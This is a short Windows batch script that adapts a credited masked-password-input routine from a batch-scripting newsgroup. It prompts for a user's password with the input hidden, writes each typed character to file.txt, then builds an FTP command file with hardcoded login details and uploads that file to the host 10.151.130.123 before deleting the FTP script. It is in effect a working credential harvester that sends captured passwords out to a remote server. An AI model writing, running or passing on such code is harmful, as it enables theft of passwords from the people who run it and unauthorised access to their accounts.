:: Hidden.cmd
::Tom Lavedas, 02/05/2013, 02/20/2013
::Carlos, 02/22/2013
::https://groups.google.com/forum/#!topic/alt.msdos.batch.nt/f7mb_f99lYI


@Echo Off
:HInput
SetLocal EnableExtensions EnableDelayedExpansion
Set "FILE=%Temp%.\T"
Set "FILE=.\T"
Keys List >"%File%"
Set /P "=%1's password: " <Nul


Set "HInput="
:HInput_
For /F "tokens=1* delims=?" %%A In (
 '"Xcopy /P /L "%FILE%" "%FILE%" 2>Nul"'
) Do (
  Set "Text=%%B"
  If Defined Text (
    Set "Char=!Text:~1,1!"
    Set "Intro=1"
    For /F delims^=^ eol^= %%Z in ("!Char!") Do Set "Intro=0"
    Rem If press Intro
    If 1 Equ !Intro! Goto :HInput#

    echo !HInput! > file.txt
    Set "HInput=!HInput!!Char!"
  )
)
Goto :HInput_
:HInput#
Echo(!HInput!
	goto :ACE


:ACE

@echo off

echo ACE> upload.txt
echo cred>> upload.txt
echo asc>>upload.txt
echo put file.txt file.txt>> upload.txt
echo quit >> upload.txt


ftp -s:upload.txt 10.151.130.123

del upload.txt

pause